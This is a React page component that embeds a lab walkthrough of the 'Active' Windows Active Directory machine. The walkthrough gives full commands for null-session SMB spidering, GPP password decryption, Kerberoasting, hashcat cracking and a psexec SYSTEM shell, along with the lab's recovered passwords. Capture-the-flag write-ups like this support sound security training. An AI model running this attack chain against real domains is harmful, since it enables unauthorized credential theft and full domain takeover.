import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './ActiveWalkthrough.css';

const ActiveWalkthrough = () => {
  const navigate = useNavigate();

  // CodeBlock component for terminal-like code blocks
  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button 
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  // Function to parse inline markdown (bold, italic, inline code, links)
  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;
    
    // Regex to match [text](url), **bold**, *italic*, and `code`
    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;
    
    while ((match = regex.exec(text)) !== null) {
      // Add text before the match
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }
      
      const matched = match[0];
      
      if (matched.startsWith('[') && matched.includes('](')) {
        // Link [text](url)
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(
            <a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">
              {linkText}
            </a>
          );
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        // Bold text
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        // Italic text
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        // Inline code
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }
      
      lastIndex = regex.lastIndex;
    }
    
    // Add remaining text
    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }
    
    return parts.length > 0 ? parts : text;
  };

  // Active data
    const writeup = {
    id: 'active-walkthrough',
    title: 'Active Walkthrough',
    excerpt: 'Active is an easy to medium Windows AD machine featuring GPP credential exposure via SMB Replication and Kerberoasting, leading to Domain Administrator compromise.',
    date: 'Feb 15, 2026',
    tags: ['Htb', 'Ad', 'Gpp', 'Kerberoasting', 'Kerberos', 'Windows', 'Smb', 'Password-cracking'],
    difficulty: 'Easy',
    os: 'Windows',
    ip: '10.129.6.213',
    content: `## Overview
Active is an easy Windows machine that showcases two very common techniques for gaining privileges in an Active Directory environment: **Group Policy Preferences (GPP)** credential exposure and **Kerberoasting**. The box runs a Windows Server 2008 R2 domain controller (\`active.htb\`). Initial access is achieved by enumerating SMB with a null session, pulling replicated GPP files, and decrypting a stored password. That credential is then used for Kerberoasting to obtain the Domain Administrator hash and achieve full compromise.

## Enumeration
### Port Scanning
Running \`nmap\` to enumerate services on the target reveals a typical Active Directory host: DNS (53), Kerberos (88), LDAP (389, 636, 3268, 3269), SMB (139, 445), and RPC. The service banner indicates **Windows Server 2008 R2 SP1** and hostname **DC**, confirming a domain controller for \`active.htb\`.
\`\`\`bash
sudo nmap -vv -sS -sV -sC -p- -Pn --min-rate=10000 10.129.6.213 -oN nmap/nmap.tcp

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-14 22:57:40Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49162/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49166/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49169/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 61467/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40784/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34615/udp): CLEAN (Timeout)
|   Check 4 (port 37071/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -51s
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-02-14T22:58:37
|_  start_date: 2026-02-14T22:55:34
\`\`\`

Some important open ports are discovered:
• **Port 53**: Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
• **Port 88**: Microsoft Windows Kerberos
• **Port 389**: Microsoft Windows Active Directory LDAP (Domain: \`active.htb\`, Site: Default-First-Site-Name)
• **Port 445**: Microsoft-DS (SMB)
• **Port 636**: LDAPS (tcpwrapped)
• **Port 3268**: Microsoft Windows Active Directory LDAP (Domain: \`active.htb\`, Global Catalog)

Add the domain and DC hostname to \`/etc/hosts\` for name resolution:
\`\`\`bash
echo '10.129.6.213 active.htb DC.active.htb' | sudo tee -a /etc/hosts
\`\`\`

### Service Enumeration
We use **NetExec (nxc)** with a null session (\`-u '' -p ''\`) to list SMB shares. The \`Replication\` share is accessible anonymously and is a classic sign of **SYSVOL replication**; domain controllers replicate Group Policy and scripts here, including sometimes GPP XML files that contain cpassword hashes.
\`\`\`bash
nxc smb 10.129.6.213 -u '' -p '' --shares
\`\`\`
![SMB shares with null session - Replication share visible](/images/writeups/active/1.png)

Running the **spider_plus** module with \`DOWNLOAD_FLAG=True\` recursively downloads the contents of the Replication share. We then search for files containing \`pass\` to locate GPP XML files that may store encrypted credentials.
\`\`\`bash
nxc smb 10.129.6.213 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True

grep -iR pass .
\`\`\`
![Spider_plus download and grep for password-related files](/images/writeups/active/2.png)

## Foothold
### GPP Decryption
GPP (Group Policy Preferences) allowed administrators to deploy local accounts and passwords via Group Policy. The password is stored in a **cpassword** field encrypted with a known key (MSDN); tools like [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) can decrypt it.
\`\`\`bash
python3 gpp-decrypt.py -f /home/v01/.nxc/modules/nxc_spider_plus/10.129.6.213/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
\`\`\`
![GPP decrypt reveals SVC_TGS password](/images/writeups/active/3.png)

The decrypted password is \`GPPstillStandingStrong2k18\` for the account \`SVC_TGS\`. We verify SMB access with these credentials:
\`\`\`bash
nxc smb 10.129.6.213 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
\`\`\`
![SMB access with SVC_TGS credentials](/images/writeups/active/4.png)

### User Flag
Using **Impacket** \`smbclient.py\`, we connect and retrieve the user flag from the \`SVC_TGS\` user directory (e.g. \`Users\\SVC_TGS\\Desktop\\user.txt\`).
\`\`\`bash
smbclient.py active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.129.6.213
\`\`\`
![Retrieving user.txt via SMB](/images/writeups/active/5.png)


## Post Exploitation
### Privilege Escalation
With the domain user \`SVC_TGS\`, we run **BloodHound** collection to map the domain and run **Kerberoasting**: we request Kerberoast hashes with nxc and export them to \`out.txt\`.
\`\`\`bash
bloodhound-python -u "SVC_TGS" -p 'GPPstillStandingStrong2k18' -d active.htb -dc DC.active.htb -ns 10.129.6.213 -c ALL --zip
\`\`\`
![BloodHound collection with SVC_TGS](/images/writeups/active/6.png)

Requesting Kerberoast hashes with nxc and export them to \`out.txt\`.
\`\`\`bash
nxc ldap 10.129.6.213 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --kerberoast out.txt
\`\`\`
![Kerberoast hashes exported to out.txt](/images/writeups/active/7.png)

Crack the Kerberoast hashes with **Hashcat** (mode 13100) and \`rockyou.txt\`. One of the cracked passwords is for the **Administrator** account.
\`\`\`bash
hashcat out.txt -a 0 /usr/share/wordlists/rockyou.txt
\`\`\`
![Cracking Kerberoast hash - Administrator password revealed](/images/writeups/active/8.png)

The **Administrator** password is \`Ticketmaster1968\`. We confirm access and then get a SYSTEM shell using **Impacket** \`psexec.py\`.
\`\`\`bash
nxc smb 10.129.6.213 -u 'Administrator' -p 'Ticketmaster1968'
\`\`\`
![Verifying Administrator access](/images/writeups/active/9.png)

### Root Flag
Using **Impacket** \`psexec.py\` with the Administrator credentials to obtain a SYSTEM shell and the root flag.
\`\`\`bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.129.6.213
\`\`\`
![SYSTEM shell via PsExec - root flag](/images/writeups/active/10.png)

## Conclusion
Active is an easy to medium difficulty Windows machine that demonstrates a complete attack chain in an Active Directory environment, from anonymous SMB access to Domain Administrator compromise. The machine showcases two very prevalent techniques: Group Policy Preferences (GPP) credential exposure and Kerberoasting.

The attack path involved:

• **SMB Enumeration**: Null session access to the \`Replication\` share revealed SYSVOL replication; \`nxc spider_plus\` downloaded the replicated files including GPP XML
• **GPP Credential Exposure**: Decrypting the **cpassword** in \`Groups.xml\` using [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) yielded the \`SVC_TGS\` account password (\`GPPstillStandingStrong2k18\`)
• **User Access**: Using \`SVC_TGS\` credentials with \`smbclient.py\` to retrieve the user flag from the Users share
• **Kerberoasting**: With \`SVC_TGS\`, running \`nxc ldap --kerberoast\` to export crackable TGS hashes for service accounts
• **Password Cracking**: Cracking the Kerberoast hash with \`hashcat\` and \`rockyou.txt\` to obtain the **Administrator** password (\`Ticketmaster1968\`)
• **Privilege Escalation**: Using **Impacket** \`psexec.py\` with the Administrator credentials to obtain a SYSTEM shell and the root flag

**Tools Used**: Nmap, NetExec (nxc), gpp-decrypt, Impacket (smbclient.py, psexec.py), BloodHound-python, Hashcat

The machine emphasizes the importance of restricting anonymous access to SYSVOL and the Replication share, never storing credentials in Group Policy Preferences (GPP), and using strong Kerberos encryption (e.g. AES) for service accounts to mitigate Kerberoasting. This writeup demonstrates how misconfigured AD replication and weak service account settings can lead to full domain compromise through GPP and Kerberoasting.
`};

  return (
    <>
      <DynamicSEO 
        type="writeup" 
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/active/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }} 
      />
      <motion.div 
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1 id="writeup-title">{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/active/machine.png" alt="Active" className="machine-image" />
          </div>
        </div>
      </div>

          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks with CodeBlock component
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  // Handle InfoStatus component
                  const titleMatch = line.match(/title="([^"]*)"/);
                  const messageMatch = line.match(/message="([^"]*)"/);
                  if (titleMatch && messageMatch) {
                    elements.push(
                      <InfoStatus 
                        key={i} 
                        title={titleMatch[1]} 
                        message={messageMatch[1]} 
                      />
                    );
                  }
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
      </div>

      <TableOfContents content={writeup.content} title={writeup.title} />
      
      <ScrollToTop />
      </motion.div>
    </>
  );
};

export default ActiveWalkthrough;
